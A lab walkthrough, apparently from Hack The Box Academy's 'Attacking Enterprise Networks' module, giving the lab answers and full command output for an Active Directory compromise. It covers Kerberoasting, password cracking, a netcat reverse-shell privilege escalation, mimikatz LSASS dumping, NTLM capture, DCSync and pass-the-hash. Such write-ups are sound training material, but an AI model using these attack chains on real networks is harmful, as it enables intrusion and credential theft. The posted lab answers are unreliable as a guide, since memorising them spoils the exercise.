# [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)

## Table of Contents

- [x] Lateral Movement and Privilege Escalation
	- [x] Lateral Movement
	- [x] Active Directory Compromise
	- [x] Post-Exploitation

---
---

## Lateral Movement and Privilege Escalation

> After pillaging the host `DEV01`, we found the following set of credentials by dumping LSA secrets: `hporter:Gr8hambino!`.

### Lateral Movement

> Since we've got our hooks deep into `DEV01` we can use it as our staging area for launching further attacks.
> We'll use the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) collector to enumerate all possible AD objects and then ingest the data into the BloodHound GUI for review.

Questions:
1. Find a backup script that contains the password for the `backupadm` user. Submit this user's password as your answer. `!qazXSW@`
2. Perform a Kerberoasting attack and retrieve TGS tickets for all accounts set as SPNs. Crack the TGS of the `backupjob` user and submit the cleartext password as your answer. `lucky7`
3. Escalate privileges on the `MS01` host and submit the contents of the `flag.txt` file on the `Administrator` desktop. `33a9d***************************`
4. Obtain the NTLMv2 password hash for the `mpalledorous` user and crack it to reveal the cleartext value. Submit the user's password as your answer. `1squints2`

**Resources**:
- [Sysax FTP Automation 6.9.0 - Privilege Escalation](https://www.exploit-db.com/exploits/50834)

#### Windows Lateral Movement - RDP

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec rdp 172.16.8.20 -u hporter -p 'Gr8hambino!'

[SNIP]

RDP         172.16.8.20     3389   ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\hporter:Gr8hambino! (Pwn3d!)
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\hporter
    password: 'Gr8hambino!'
    host: 172.16.8.20
    port: 3389 (RDP)
```

```
┌──(nabla㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.8.20 /u:hporter /p:'Gr8hambino!' /dynamic-resolution /drive:shared,~/shared +clipboard
```

```
C:\Users\hporter> whoami

inlanefreight\hporter
```

#### BloodHound Analysis

```
C:\Users\hporter> c:\users\public\SharpHound.exe -c all

[SNIP]

2025-08-09T02:55:35.8798528-07:00|INFORMATION|Enumeration finished in 00:00:20.3423698
2025-08-09T02:55:36.1767189-07:00|INFORMATION|Saving cache with stats: 19 ID to type mappings.
 2 name to SID mappings.
 3 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-08-09T02:55:36.2079734-07:00|INFORMATION|SharpHound Enumeration Completed at 2:55 AM on 8/9/2025! Happy Graphing!
```

![BloodHound - hporter ---(ForceChangePassword)--- ssmalls](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_01.png)

![BloodHound - Domain Users ---(CanRDP)--- ACADEMY.AEN.DEV01](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_02.png)

#### ResetPassword Rights Abuse

```
PS C:\Users\hporter> Import-Module c:\users\public\PowerView.ps1

PS C:\Users\hporter> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Test123!' -AsPlainText -Force ) -Verbose
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec rdp 172.16.8.20 -u ssmalls -p 'Test123!'

[SNIP]

RDP         172.16.8.20     3389   ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\ssmalls:Test123! (Pwn3d!)
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\ssmalls
    password: 'Test123!'
    host: 172.16.8.20
    port: 3389 (RDP)
```

#### Pillaging - Credential Hunting

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.8.3 -u ssmalls -p 'Test123!' --shares

[SNIP]

SMB         172.16.8.3      445    DC01             [*] Enumerated shares
SMB         172.16.8.3      445    DC01             Share           Permissions     Remark
SMB         172.16.8.3      445    DC01             -----           -----------     ------
SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin
SMB         172.16.8.3      445    DC01             C$                              Default share
SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users
SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC
SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.8.3 -u ssmalls -p 'Test123!' --spider 'Department Shares' --content --regex 'Password|password|passwd|pass|User|user|Username|username'

[SNIP]

SMB         172.16.8.3      445    DC01             [*] Started spidering
SMB         172.16.8.3      445    DC01             //172.16.8.3/Department Shares/IT/Private/Development/SQL Express Backup.ps1 [lastm:'2022-06-01 13:35' size:4001 offset:4001 regex:'b'Password|password|passwd|pass|User|user|Username|username'']
SMB         172.16.8.3      445    DC01             [*] Done spidering (Completed in 1.1606903076171875)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.8.3 -u ssmalls -p 'Test123!' --share 'Department Shares' --get-file 'IT/Private/Development/SQL Express Backup.ps1' 'SQL Express Backup.ps1'

[SNIP]

SMB         172.16.8.3      445    DC01             [+] File "IT/Private/Development/SQL Express Backup.ps1" was downloaded to "SQL Express Backup.ps1"
```

```
┌──(nabla㉿kali)-[~]
└─$ cat 'SQL Express Backup.ps1'

[SNIP]

$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@" 📌
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec winrm 172.16.8.50 -u backupadm -p '!qazXSW@'

[SNIP]

WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\backupadm
    password: '!qazXSW@'
    host: 172.16.8.50
    port: 5985 (WINRM)
```

#### Kerberoasting Attack

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter:'Gr8hambino!' -request -outputfile ilfreight_tgs.hashes

[SNIP]

ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 13:32:56.506935  <never>                                
backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 13:33:00.038178  <never>                                

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ hashcat -m 13100 ilfreight_tgs.hashes /usr/share/wordlists/rockyou.txt

[SNIP]

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$054fe0eb3d1b40494d2682815c2dda6c$3003cff8b12081ed828974a2111beec24e71ab1d00471aea7bb832c6da56498c6199b9d060e0085cd5573d9c2c124772a8babc234cfa8d4ad234e5e2757021317cef13b11d4b816a360890e8a3579f6a39ed03a2d51172831891f8f78c27b6f4058dafaef570d8cd69ae1c21729f418c15be5a6123e1d9424a1ea5ab452d32f5a7b89a869f6d2edf9dd16023b1296d2817d5894c3a4914504326b1179b6f01c6bd217ea997067c89f50178a9072b5d64398fc8a9a843248b7946aa2ef37140b18c43c56cfd78102a6b68c9dce6d31effc39cf5b9520b1babff4d01dde6e1646444c48407bdadeddd7cae281e33d47d2e8f10ea4b8657c5a02c8521ba8b718d8b17ccdb248a9b713fea0cac1c1d78ff182ec0fc2d332d8de8f7208b86d66d73c910ef4f9c3ebde96fa1a24c8f49766b646b787e9d39fd4f2fd494c96e73f5b295ad86f0dfc4b7528e0c7951e9161940d4f76f52e04f2f4a41e35c27d9414e0671e922f17cd6e1d9279d1453ec21f9a58b42166cad8cec023e788e870ebc23fba7342d564b0293a79a3361ba145009d674c5505db8f6293581254359a4eb563ef9204d90ed6501d01f0ab2f21e1edee1a6b2c4d146119509b70e69f50f88174ef75c86e013d115550fb2c0bf4f78398b25412403a7c30a74b48fa1fee6e266cc5ac7bdf0ad42dd0555865e6ed72d22934413bae70446bc36e7402038b6cb2f2045bdde7d77488ec81c885de2c2a973a02b246f3f75974ba165a504639d807ded5a9b5f6e4f10f32e3ae3df0978a59db0d58cfc873e19baf32edff3cf2c0235b36b73a2af0c107689e24bef179a1bd96b59c3d2cb1680d02a2e105c806a05c209185c69239827fc636b1b8f22a8c930fcca554391ecc75e64b0588855dcf986f94d1d1d0689a332cac3db0e8f60894a17b9b01ccaba289bc1963d5f0d984373f1f3300c07430fa3fc7edab43bfb93536130708e83ead83405b0282e8c52b43ea023b162d5192070724dc84e237169c16258abe185e1b602ab5001ea3315194fa035752ee0ae8ac4a4b64189fac2bfc7cc97ca6f74b603650ad02ed2477f4e5d87efb84962689e2a0be5488525d3e10317d411bb52cf53c7feefcda38673d7aa2bd7b57f5db18133ec8c98c3c64146de003cfd5f69113d207ae381813fc397d483f99274d43165444f39c59c848b42503c44146025784676a7a8c3864df857b5d9156a65b65e6388bbf1de6bd580e3b98db3d83650eb0e2e8ecb50bd6cc5c53169f4fbfbc1f00463af41d0b6e2cf03d6f3345d6d15373ab5c012cea71b97d2559cfc0510ac739e74bb0237f6a5cfed61a53e1a70c072a724547ae32a28:lucky7 📌

Session..........: hashcat
Status...........: Quit
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

#### Windows Lateral Movement - WinRM

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'

[SNIP]

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\backupadm\Documents> 
```

#### Pillaging - Credential Hunting

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> Get-ChildItem C:\ -Recurse -Include *.xml -ErrorAction Ignore | Select-String "password" -List

[SNIP]

C:\panther\unattend.xml:19:                <Password>
```

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> type C:\panther\unattend.xml

[SNIP]

<AutoLogon>
	<Password>
		<Value>Sys26Admin</Value>
		<PlainText>true</PlainText>
	</Password>
	<Enabled>true</Enabled>
	<LogonCount>1</LogonCount>
	<Username>ilfserveradm</Username>
</AutoLogon>
```

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> net user ilfserveradm

[SNIP]

Local Group Memberships      *Remote Desktop Users
Global Group memberships     *None
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec rdp 172.16.8.50 -u ilfserveradm -p 'Sys26Admin' --local-auth

[SNIP]

RDP         172.16.8.50     3389   ACADEMY-AEN-MS0  [+] ACADEMY-AEN-MS0\ilfserveradm:Sys26Admin (Pwn3d!)
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\ilfserveradm
    password: 'Sys26Admin'
    host: 172.16.8.50
    port: 3389 (RDP)
```

#### Windows Lateral Movement - RDP

```
┌──(nabla㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:'Sys26Admin' /dynamic-resolution /drive:shared,~/shared +clipboard
```

#### Windows Privilege Escalation - Service Abuse

```
PS C:\Users\ilfserveradm> Import-Module c:\users\public\PowerUp.ps1

PS C:\Users\ilfserveradm> Invoke-AllChecks

[SNIP]

DefaultDomainName    : INLANEFREIGHT
DefaultUserName      : mssqladm
DefaultPassword      :
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons
```

```
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"

DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```

```
PS C:\Users\ilfserveradm> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation; $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation; $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
Apache Tomcat 10.0 Tomcat10 (remove only)                          10.0.21
Java 8 Update 333 (64-bit)                                         8.0.3330.2      C:\Program Files\Java\jre1.8.0_333\
Java Auto Updater                                                  2.8.333.2
Java(TM) SE Development Kit 18.0.1.1 (64-bit)                      18.0.1.1        C:\Program Files\Java\jdk-18.0.1.1\
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913 14.28.29913.0
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913 14.28.29913.0
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913     14.28.29913
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913        14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913     14.28.29913
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913        14.28.29913
Mozilla Firefox (x64 en-US)                                        100.0.1         C:\Program Files\Mozilla Firefox
Mozilla Maintenance Service                                        100.0.1
Sysax FTP Automation 6                                             6.1.0           C:\Program Files (x86)\SysaxAutomation\
VMware Tools                                                       11.3.5.18557794 C:\Program Files\VMware\VMware Tools\
```

![Firefox - Exploit Database - EDB-ID: 50834](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_03.png)

```txt
# Exploit:
Logged in as low privileged account

1. Create folder c:\temp
2. Download netcat (nc.exe) to c:\temp
3. Create file 'pwn.bat' in c:\temp with contents
	c:\temp\nc.exe localhost 1337 -e cmd
4. Open command prompt and netcat listener
	nc -nlvvp 1337
5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
6. Select Setup Scheduled/Triggered Tasks
	- Add task (Triggered)
	- Update folder to monitor to be c:\temp
	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
	- Uncheck 'Login as the following user to run task'
	- Finish and Save
7. Create new text file in c:\temp
8. Check netcat listener
	C:\WINDOWS\system32>whoami
	whoami
	nt authority\system
```

```
PS C:\Users\ilfserveradm> Get-Service SysaxScheduler

Status   Name               DisplayName
------   ----               -----------
Running  SysaxScheduler     Sysax Scheduler Service
```

```
C:\Users\ilfserveradm> c:\users\public\nc.exe -lvnp 1337

listening on [any] 1337 ...

[CONTINUE]
```

```
PS C:\Users\ilfserveradm> echo "c:\users\public\nc.exe localhost 1337 -e cmd" > c:\users\public\pwn.bat
```

```
PS C:\Users\ilfserveradm> "c:\program files (x86)\SysaxAutomation\sysaxschedscp.exe"
```

![FTP Automation Script Wizard 1](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_04.png)

![FTP Automation Script Wizard 2](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_05.png)

```
PS C:\Users\ilfserveradm> echo "Triggering!" > c:\users\public\trigger.txt
```

```
[CONTINUE]

connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 49732

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```
C:\Windows\system32> whoami

nt authority\system
```

```
C:\Windows\system32> type c:\users\administrator\desktop\flag.txt

33a9d*************************** 📌
```

#### Credential Extraction - LSASS Dump

```
C:\Windows\system32> c:\users\public\mimikatz.exe "token::elevate" "sekurlsa::logonpasswords" "exit"

[SNIP]

Authentication Id : 0 ; 234196 (00000000:000392d4)
Session           : Interactive from 1
User Name         : mssqladm
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/19/2025 4:23:55 AM
SID               : S-1-5-21-2814148634-3729814499-1637837074-4623
        msv :
         [00000003] Primary
         * Username : mssqladm
         * Domain   : INLANEFREIGHT
         * NTLM     : 31311a46c8a625d2df6a33af4cac1e21
         * SHA1     : 6bb4405bf0d83fd7ff284be24973b0dab4157f01
         * DPAPI    : 508b6bcb5a435a8e6f2f9e9bc92e4a6c
        tspkg :
        wdigest :
         * Username : mssqladm
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : mssqladm
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : DBAilfreight1!
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec rdp 172.16.8.20 -u mssqladm -p 'DBAilfreight1!'

[SNIP]

RDP         172.16.8.20     3389   ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1! (Pwn3d!)
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\mssqladm
    password: 'DBAilfreight1!'
    host: 172.16.8.20
    port: 3389 (RDP)
```

#### Windows Persistence - Local Admin Group Membership

```
C:\Windows\system32> net localgroup administrators ilfserveradm /add
```

```
┌──(nabla㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:'Sys26Admin' /dynamic-resolution /drive:shared,~/shared +clipboard
```

```
C:\Windows\system32> net localgroup administrators

[SNIP]

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
```

#### LLMNR/NBT-NS Poisoning & NTLM Capure

```
PS C:\Windows\system32> Import-Module c:\users\public\Inveigh.ps1

PS C:\Windows\system32> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[SNIP]

[+] [2025-08-19T05:08:28] TCP(445) SYN packet detected from 172.16.8.20:50140
[+] [2025-08-19T05:08:28] SMB(445) negotiation request detected from 172.16.8.20:50140
[+] [2025-08-19T05:08:29] Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
[+] [2025-08-19T05:08:29] SMB(445) NTLM challenge 53D6331DD264B492 sent to 172.16.8.20:50140
[+] [2025-08-19T05:08:29] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20(ACADEMY-AEN-DEV):50140:

PS C:\Windows\system32> type Inveigh-NTLMv2.txt
mpalledorous::ACADEMY-AEN-DEV:53D6331DD264B492:97614E65287C08F7F1E90CF4D83C1CE7:01010000000000008479C635F110DC013BB59C8365441DAC0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008008479C635F110DC010600040002000000080030003000000000000000000000000020000006968C351E72D868AD5CA09DB8B4B74C82D83E363202D8ACB6F1FA3AD090DE750A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
```

```
┌──(nabla㉿kali)-[~]
└─$ hashcat -m 5600 mpalledorous.hash /usr/share/wordlists/rockyou.txt

[SNIP]

MPALLEDOROUS::ACADEMY-AEN-DEV:53d6331dd264b492:97614e65287c08f7f1e90cf4d83c1ce7:01010000000000008479c635f110dc013bb59c8365441dac0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00410045004e002d004d00530030000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004800410043004100440045004d0059002d00410045004e002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008008479c635f110dc010600040002000000080030003000000000000000000000000020000006968c351e72d868ad5ca09db8b4b74c82d83e363202d8acb6f1fa3ad090de750a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0038002e0035003000000000000000000000000000:1squints2 📌

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

---

### Active Directory Compromise

> To recap, we dug through the Active Directory environment and obtained the following credential pair: `mssqladm:DBAilfreight1!`.

> Digging into the BloodHound data we see that we have `GenericWrite` over the `ttimmons` user. Using this we can set a fake SPN on the `ttimmons account` and perform a targeted Kerberoasting attack. If this user is using a weak password then we can crack it and proceed onwards.

Questions:
1. Set a fake SPN on the `ttimmons` user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer. `Repeat09`
2. After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the `flag.txt` file on the `Administrator` desktop. `7c09e***************************`
3. Compromise the `INLANEFREIGHT.LOCAL` domain and dump the NTDS database. Submit the NT hash of the `Administrator` account as your answer. `fd1f7e5564060258ea787ddbb6e6afa2`

#### BloodHound Analysis

![BloodHound - mssqladm ---(GenericWrite)--- ttimmons](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_06.png)

![BloodHound - ttimmons ---(GenericAll)--- Server Admins](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_07.png)

#### Windows Lateral Movement - RDP

```
┌──(nabla㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.8.20 /u:mssqladm /p:'DBAilfreight1!' /dynamic-resolution /drive:shared,~/shared +clipboard
```

#### Targeted Kerberoasting Attack

```
PS C:\Users\mssqladm> Import-Module c:\users\public\PowerView.ps1

PS C:\Users\mssqladm> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force

PS C:\Users\mssqladm> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)

PS C:\Users\mssqladm> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

[SNIP]

VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'ttimmons'
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!' -request-user ttimmons

[SNIP]

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$c04626a493eccf2038abe183e6aa7662$00bbd122b14fd2491e83ffd33619871297d94454fbcb0926b768930a408a87f7fcfd607f9c4e1524c41ccc31c2f5e5238a7f020b27510709baf29a902803f8ba76c65a814ec0c003

[SNIP]

7e3e50ca40f669a26852695579c227a4faa1271c981a0c2e20865db8673a94abe1017253ca983fa712e044473e4a8cf18091f5f4d72d9e4da19442406dda
```

```
┌──(nabla㉿kali)-[~]
└─$ hashcat -m 13100 ttimmons.hash /usr/share/wordlists/rockyou.txt

[SNIP]

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$c04626a493eccf2038abe183e6aa7662$00bbd122b14fd2491e83ffd33619871297d94454fbcb0926b768930a408a87f7fcfd607f9c4e1524c41ccc31c2f5e5238a7f020b27510709baf29a902803f8ba76c65a814ec0c003

[SNIP]

7e3e50ca40f669a26852695579c227a4faa1271c981a0c2e20865db8673a94abe1017253ca983fa712e044473e4a8cf18091f5f4d72d9e4da19442406dda:Repeat09 📌

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\ttimmons
    password: 'Repeat09'
    host: 172.16.8.3
    port: 445 (SMB)
```

#### BloodHound Analysis

![BloodHound - Server Admins ---(GetChangesAll/DS-Replication-Get-Changes-All)--- INLANEFREIGH.LOCAL](./assets/screenshots/attacking_enterprise_networks_lateral_movement_and_privilege_escalation_08.png)

#### DCSync Attack

```
PS C:\Users\mssqladm> Import-Module c:\users\public\PowerView.ps1

PS C:\Users\mssqladm> $SecPassword2 = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force

PS C:\Users\mssqladm> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $SecPassword2)

PS C:\Users\mssqladm> $Group = Convert-NameToSid "Server Admins"

PS C:\Users\mssqladm> Add-DomainGroupMember -Identity $Group -Members 'ttimmons' -Credential $Cred2 -verbose

[SNIP]

VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622'
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q impacket-secretsdump 'INLANEFREIGHT/ttimmons:Repeat09'@172.16.8.3 -just-dc-ntlm

[SNIP]

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2::: 📌
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::

[SNIP]
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\Administrator
    NTLM: 'fd1f7e5564060258ea787ddbb6e6afa2'
    host: 172.16.8.3
    port: 445 (SMB)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.8.3 -u administrator -H 'fd1f7e5564060258ea787ddbb6e6afa2'

[SNIP]

SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\administrator:fd1f7e5564060258ea787ddbb6e6afa2 (Pwn3d!)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.8.3 -u administrator -H 'fd1f7e5564060258ea787ddbb6e6afa2' -x 'type c:\users\administrator\desktop\flag.txt'

[SNIP]

SMB         172.16.8.3      445    DC01             [+] Executed command via wmiexec
SMB         172.16.8.3      445    DC01             7c09e*************************** 📌
```

---

### Post-Exploitation

> Once we've compromised the domain, depending on the assessment type, our work is not over. There are many things we can do to add additional value to our clients. If the goal of the assessment was to reach Domain Admin and nothing further, then we are done and should make sure we have all of our command/log output, scan data, and screenshots and continue drafting the report. If the assessment was goal focused (i.e., gain access to a specific database) we should continue working towards that goal. Domain Admin rights may be just the start as there could be other networks, domains, or forests in play that we will need to find our way into. If the assessment is more open ended and the client asked us to demonstrate as much impact as possible there are quite a few things we can do to add value and help them improve their security posture.

Questions:
1.  Gain access to the `MGMT01` host and submit the contents of the `flag.txt` file in a user's home directory. ``
2. Escalate privileges to root on the `MGMT01` host. Submit the contents of the `flag.txt` file in the `/root` directory. ``

**Resources**:
- [CVE-2022-0847 DirtyPipe Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)

#### Linux Lateral Movement - SSH

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '10.129.32.67\tinlanefreight.local' | sudo tee -a /etc/hosts

10.129.32.67	inlanefreight.local
```

```yaml
credentials:
    username: srvadm
    password: 'ILFreightnixadm!'
    host: inlanefreight.local
    port: 22 (SSH)
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh srvadm@inlanefreight.local

srvadm@inlanefreight.local's password: 

[SNIP]

srvadm@dmz01:~$ 
```

#### Pivoting, Tunneling & Port Forwarding - Ligolo-ng Pivot

```
┌──(nabla㉿kali)-[~]
└─$ scp ligolo-agent srvadm@inlanefreight.local:~

srvadm@inlanefreight.local's password: 

ligolo-agent                                  100% 6324KB  31.2MB/s   00:00
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up

┌──(nabla㉿kali)-[~]
└─$ sudo ./ligolo-proxy -selfcert -laddr 10.10.15.59:443

[SNIP]

INFO[0000] Listening on 10.10.15.59:443

ligolo-ng »
```

```
srvadm@dmz01:~$ ./ligolo-agent -connect 10.10.15.59:443 -ignore-cert

WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.15.59:443"
```

```
[CONTINUE]

ligolo-ng » INFO[0202] Agent joined.                                 id=00505694aaad name=srvadm@dmz01 remote="10.129.32.67:49710"

ligolo-ng » session
? Specify a session : 1 - srvadm@dmz01 - 10.129.32.67:49710 - 00505694aaad

[Agent : srvadm@dmz01] » start
INFO[0220] Starting tunnel to srvadm@dmz01 (00505694aaad)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo ip route add 172.16.8.0/24 dev ligolo

┌──(nabla㉿kali)-[~]
└─$ ip route list

[SNIP]

172.16.8.0/24 dev ligolo scope link
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb 172.16.8.3 172.16.8.20 172.16.8.50

[SNIP]

SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
```

#### Windows Lateral Movement - WinRM

```
┌──(nabla㉿kali)-[~]
└─$ evil-winrm -i 172.16.8.3 -u administrator -H 'fd1f7e5564060258ea787ddbb6e6afa2'

[SNIP]

